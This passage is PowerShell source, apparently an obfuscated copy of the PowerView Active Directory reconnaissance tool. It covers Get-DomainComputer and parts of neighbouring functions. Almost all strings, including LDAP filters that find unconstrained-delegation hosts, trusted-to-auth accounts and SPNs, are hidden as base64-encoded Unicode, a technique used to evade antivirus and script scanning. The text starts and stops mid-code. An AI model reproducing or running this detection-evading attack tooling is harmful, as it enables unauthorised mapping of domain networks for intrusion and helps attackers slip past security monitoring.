([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8Acg
AgAGkAbgAgAGIAdQBpAGwAZABpAG4AZwAgAEcAVQBJAEQAIABtAGEAcAA6ACAAJABfAA
==')))
        }
    }
    ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = 
${cc2f4722662c4c888c3d64686cfec76d}.replace
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBjAGgAZQBtAGEA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RQB4AHQAZQBuAGQAZQBkAC0AUgBpAGcAaAB0AHMA'))))
    
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBjAG8AbgB0AHIAbwBsAEEAYwBjAGUAcw
BzAFIAaQBnAGgAdAApAA==')))
    ${15f352ab09354f2daa0af77c713a9639} = 
Get-DomainSearcher @ea43c787582f45539b7f519da4680c7a
    if 
(${15f352ab09354f2daa0af77c713a9639}) {
        try {
            
${9f78951ba80c437e9db41515f07bc24e} = 
${15f352ab09354f2daa0af77c713a9639}.FindAll()
            
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                ${ca3d4121ac6f47a0a0442dc1d46ba182}
[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
     
       }
            if (${9f78951ba80c437e9db41515f07bc24e}) {
       
         try { ${9f78951ba80c437e9db41515f07bc24e}.dispose() }
       
         catch {
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8Acg
AgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzAC
AAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                }
            }
     
       ${15f352ab09354f2daa0af77c713a9639}.dispose()
        }
        
catch {
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8Acg
AgAGkAbgAgAGIAdQBpAGwAZABpAG4AZwAgAEcAVQBJAEQAIABtAGEAcAA6ACAAJABfAA
==')))
        }
    }
    ${ca3d4121ac6f47a0a0442dc1d46ba182}
}
function 
Get-DomainComputer {
    [OutputType('PowerView.Computer')]
    
[OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param 
(
        [Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        
$Identity,
        [Switch]
        $Unconstrained,
        [Switch]
    
    $TrustedToAuth,
        [Switch]
        $Printers,
        
[ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
    
    [String]
        $SPN,
        [ValidateNotNullOrEmpty()]
        
[String]
        $OperatingSystem,
        [ValidateNotNullOrEmpty()]
  
      [String]
        $ServicePack,
        [ValidateNotNullOrEmpty
()]
        [String]
        $SiteName,
        [Switch]
        $Ping,
  
      [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
     
   [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        
[String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
       
 [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
    
    [Alias('ADSPath')]
        [String]
        $SearchBase,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 
'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        
[Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        
[Switch]
        $FindOne,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$Raw
    )
    DynamicParam {
        
${166ef91acae049d6998dbeb4efc8e2e2} = [Enum]::GetNames
(${9ad57110e7184c649f993e0b08059b53})
        
${166ef91acae049d6998dbeb4efc8e2e2} = 
${166ef91acae049d6998dbeb4efc8e2e2} | ForEach-Object {$_; 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBPAFQAXwAkAF8A')))}
        New-DynamicParameter -Name UACFilter 
-ValidateSet ${166ef91acae049d6998dbeb4efc8e2e2} -Type ([array])
    
}
    BEGIN {
        ${ea43c787582f45539b7f519da4680c7a} = @{}
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${bdb692d6359b4e7e9b8f6356aa65409a} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
    }
    PROCESS {
        if 
($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
         
   New-DynamicParameter -CreateVariables -BoundParameters 
$PSBoundParameters
        }
        if 
(${bdb692d6359b4e7e9b8f6356aa65409a}) {
            
${987d1cda8c15450d8512978866836ba0} = ''
            $Filter = ''
     
       $Identity | Where-Object {$_} | ForEach-Object {
              
  ${0c2b6ec1d84e4c9188d4d73c607426d3} = $_.Replace('(', 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAyADkA'))))
                if 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBTAC0AMQAtAA==')))) {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAwAGMAMgBiADYAZQBjADEAZAA4ADQAZQ
A0AGMAOQAxADgAOABkADQAZAA3ADMAYwA2ADAANwA0ADIANgBkADMAfQApAA==')))
   
             }
                elseif 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBDAE4APQA=')))) {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMABjADIAYg
A2AGUAYwAxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyAD
YAZAAzAH0AKQA=')))
                    if ((-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        
${84423cbf5a544fd6aa05dc7201f84256} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.SubString
(${0c2b6ec1d84e4c9188d4d73c607426d3}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                 Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAARQB4AHQAcg
BhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADgANAA0ADIAMwBjAGIAZgA1AG
EANQA0ADQAZgBkADYAYQBhADAANQBkAGMANwAyADAAMQBmADgANAAyADUANgB9ACcAIA
BmAHIAbwBtACAAJwAkAHsAMABjADIAYgA2AGUAYwAxAGQAOAA0AGUANABjADkAMQA4AD
gAZAA0AGQANwAzAGMANgAwADcANAAyADYAZAAzAH0AJwA=')))
                   
     ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = ${84423cbf5a544fd6aa05dc7201f84256}
        
                ${bdb692d6359b4e7e9b8f6356aa65409a} = Get-
DomainSearcher @ea43c787582f45539b7f519da4680c7a
                     
   if (-not ${bdb692d6359b4e7e9b8f6356aa65409a}) {
                   
         Write-Warning $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAVQBuAGEAYg
BsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAH
IAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsAOAA0ADQAMgAzAGMAYgBmADUAYQA1ADQANA
BmAGQANgBhAGEAMAA1AGQAYwA3ADIAMAAxAGYAOAA0ADIANQA2AH0AJwA=')))
       
                 }
                    }
                }
             
   elseif (${0c2b6ec1d84e4c9188d4d73c607426d3}.Contains('.')) {
      
              ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACgAbgBhAG0AZQA9ACQAewAwAGMAMgBiADYAZQBjADEAZAA4ADQAZQA0AGMAOQ
AxADgAOABkADQAZAA3ADMAYwA2ADAANwA0ADIANgBkADMAfQApACgAZABuAHMAaABvAH
MAdABuAGEAbQBlAD0AJAB7ADAAYwAyAGIANgBlAGMAMQBkADgANABlADQAYwA5ADEAOA
A4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AGQAMwB9ACkAKQA=')))
               
 }
                elseif (${0c2b6ec1d84e4c9188d4d73c607426d3} -
imatch $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQ
AtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
            
        ${3e0cccb945b440b99b2100f08845f4a8} = 
(([Guid]${0c2b6ec1d84e4c9188d4d73c607426d3}).ToByteArray() | 
ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                 
   ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADMAZQAwAGMAYwBjAGIAOQA0ADUAYg
A0ADQAMABiADkAOQBiADIAMQAwADAAZgAwADgAOAA0ADUAZgA0AGEAOAB9ACkA')))
   
             }
                else {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABuAGEAbQBlAD0AJAB7ADAAYwAyAGIANgBlAGMAMQBkADgANABlADQAYwA5ADEAOA
A4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AGQAMwB9ACkA')))
                }
  
          }
            if (${987d1cda8c15450d8512978866836ba0} -and 
(${987d1cda8c15450d8512978866836ba0}.Trim() -ne '') ) {
              
  $Filter += $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACQAewA5ADgANwBkADEAYwBkAGEAOABjADEANQA0ADUAMABkADgANQAxADIAOQ
A3ADgAOAA2ADYAOAAzADYAYgBhADAAfQApAA==')))
            }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) {
                
Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcg
BjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAG
YAbwByACAAdQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAAgAGQAZQBsAGUAZwBhAHQAaQ
BvAG4A')))
                $Filter += 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOA
A0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADUAMgA0ADIAOAA4AC
kA')))
            }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VAByAHUAcwB0AGUAZABUAG8AQQB1AHQAaAA=')))]) {
                
Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcg
BjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdABoAGEAdAAgAG
EAcgBlACAAdAByAHUAcwB0AGUAZAAgAHQAbwAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdA
BlACAAZgBvAHIAIABvAHQAaABlAHIAIABwAHIAaQBuAGMAaQBwAGEAbABzAA==')))
   
             $Filter += $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('KABtAHMAZABzAC0AYQBsAGwAbwB3AGUAZAB0AG8AZABlAGwAZQBnAGEAdABlAHQAbw
A9ACoAKQA=')))
            }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAGkAbgB0AGUAcgBzAA==')))]) {
                Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcg
BjAGgAaQBuAGcAIABmAG8AcgAgAHAAcgBpAG4AdABlAHIAcwA=')))
               
 $Filter += $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBwAHIAaQBuAHQAUQB1AGUAdQ
BlACkA')))
            }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBQAE4A')))]) {
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcg
BjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAF
MAUABOADoAIAAkAFMAUABOAA==')))
                $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABzAGUAcgB2AGkAYwBlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAPQAkAFMAUA
BOACkA')))
            }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))]) {
                
Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcg
BjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAG
8AcABlAHIAYQB0AGkAbgBnACAAcwB5AHMAdABlAG0AOgAgACQATwBwAGUAcgBhAHQAaQ
BuAGcAUwB5AHMAdABlAG0A')))
                $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQA9ACQATwBwAGUAcgBhAHQAaQ
BuAGcAUwB5AHMAdABlAG0AKQA=')))
            }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))]) 
{
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcg
BjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAH
MAZQByAHYAaQBjAGUAIABwAGEAYwBrADoAIAAkAFMAZQByAHYAaQBjAGUAUABhAGMAaw
A=')))
                $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQBzAGUAcgB2AGkAYwBlAHAAYQ
BjAGsAPQAkAFMAZQByAHYAaQBjAGUAUABhAGMAawApAA==')))
            }
      
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))]) {
       
         Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcg
BjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAH
MAaQB0AGUAIABuAGEAbQBlADoAIAAkAFMAaQB0AGUATgBhAG0AZQA=')))
           
     $Filter += $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABzAGUAcgB2AGUAcgByAGUAZgBlAHIAZQBuAGMAZQBiAGwAPQAkAFMAaQB0AGUATg
BhAG0AZQApAA==')))
            }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAVQBzAGkAbg
BnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6AC
AAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            
$UACFilter | Where-Object {$_} | ForEach-Object {
                if 
($_ -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                
    ${94bc4eae246742248efd06d55f760378} = $_.Substring(4)
            
        ${31f162691d5f4e939decf3286c312d49} = [Int]
(${9ad57110e7184c649f993e0b08059b53}::
${94bc4eae246742248efd06d55f760378})
                    $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMg
AuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsAMwAxAG
YAMQA2ADIANgA5ADEAZAA1AGYANABlADkAMwA5AGQAZQBjAGYAMwAyADgANgBjADMAMQ
AyAGQANAA5AH0AKQApAA==')))
                }
                else {
    
                ${31f162691d5f4e939decf3286c312d49} = [Int]
(${9ad57110e7184c649f993e0b08059b53}::$_)
                    $Filter 
+= $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOA
A0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewAzADEAZgAxAD
YAMgA2ADkAMQBkADUAZgA0AGUAOQAzADkAZABlAGMAZgAzADIAOAA2AGMAMwAxADIAZA
A0ADkAfQApAA==')))
                }
            }
            
${bdb692d6359b4e7e9b8f6356aa65409a}.filter = 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMw
A2ADkAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-
DomainComputer] Get-DomainComputer filter string: 
$(${bdb692d6359b4e7e9b8f6356aa65409a}.filter)"
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { 
${9f78951ba80c437e9db41515f07bc24e} = 
${bdb692d6359b4e7e9b8f6356aa65409a}.FindOne() }
            else { 
${9f78951ba80c437e9db41515f07bc24e} = 
${bdb692d6359b4e7e9b8f6356aa65409a}.FindAll() }
            
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                ${4efbcb35501b479291674720e11a9ca9} = $True
  
              if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABpAG4AZwA=')))]) {
                    
${4efbcb35501b479291674720e11a9ca9} = Test-Connection -Count 1 -
Quiet -ComputerName $_.properties.dnshostname
                }
       
         if (${4efbcb35501b479291674720e11a9ca9}) {
                  
  if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UgBhAHcA')))]) {
                       
 ${9c0baec859734fc983ee3c04b4cde8a7} = $_
                        
${9c0baec859734fc983ee3c04b4cde8a7}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIALgBSAGEAdwA='))))
  
                  }
                    else {
                        
${9c0baec859734fc983ee3c04b4cde8a7} = Convert-LDAPProperty -
Properties $_.Properties
                        
${9c0baec859734fc983ee3c04b4cde8a7}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIA'))))
              
      }
                    ${9c0baec859734fc983ee3c04b4cde8a7}
       
         }
            }
            if 
(${9f78951ba80c437e9db41515f07bc24e}) {
                try { 
${9f78951ba80c437e9db41515f07bc24e}.dispose() }
                catch 
{
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAARQByAHIAbw
ByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AH
MAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                }
            
}
            ${bdb692d6359b4e7e9b8f6356aa65409a}.dispose()
        }
  
  }
}
function Get-DomainObject {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType
('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 
'MemberDistinguishedName', 'MemberName')]
        [String[]]
        
$Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        
$Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
  
      [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty
()]
        [String[]]
        $Properties,
        
[ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
       
 [Alias('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet
('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        
$SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias
('ReturnOne')]
        [Switch]
        $FindOne,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$Raw
    )
    DynamicParam {
        
${166ef91acae049d6998dbeb4efc8e2e2} = [Enum]::GetNames
(${9ad57110e7184c649f993e0b08059b53})
        
${166ef91acae049d6998dbeb4efc8e2e2} = 
${166ef91acae049d6998dbeb4efc8e2e2} | ForEach-Object {$_; 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
